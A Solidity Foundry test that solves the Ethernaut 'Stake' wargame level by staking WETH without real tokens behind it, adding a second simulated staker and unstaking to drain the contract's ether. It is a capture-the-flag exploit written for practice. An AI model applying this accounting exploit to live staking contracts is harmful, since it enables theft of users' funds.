pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "openzeppelin-contracts/token/ERC20/IERC20.sol";
import "../../src/ethernaut/core/Ethernaut.sol";
import "../../src/ethernaut/31-Stake/Stake.sol";
import "../../src/ethernaut/31-Stake/StakeFactory.sol";

contract StakeTest is Test {
    Ethernaut ethernaut;

    function setUp() public {
        //setup
        ethernaut = new Ethernaut();
    }

    function testAttck() public {
        StakeFactory factory = new StakeFactory();
        ethernaut.registerLevel(factory);
        address levelAddress = ethernaut.createLevelInstance(factory);

        Stake stake = Stake(levelAddress);
        IERC20 weth = IERC20(stake.WETH());
        weth.approve(address(stake), 1 ether);

        stake.StakeETH{value: 0.01 ether}();
        stake.StakeWETH(0.01 ether);
        
        //模拟另一位user
        vm.startPrank(vm.addr(1));
        vm.deal(vm.addr(1), 1 ether);
        stake.StakeETH{value: 0.02 ether}();
        vm.stopPrank();
        // unstake
        stake.Unstake(0.02 ether);

        console.log("total staked", stake.totalStaked());
        console.log("ether balance", levelAddress.balance);
        console.log("user stake", stake.UserStake(address(this)));
        console.log("staker", stake.Stakers(address(this)));

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        assert(levelSuccessfullyPassed);
    }

    fallback() external payable {}
}
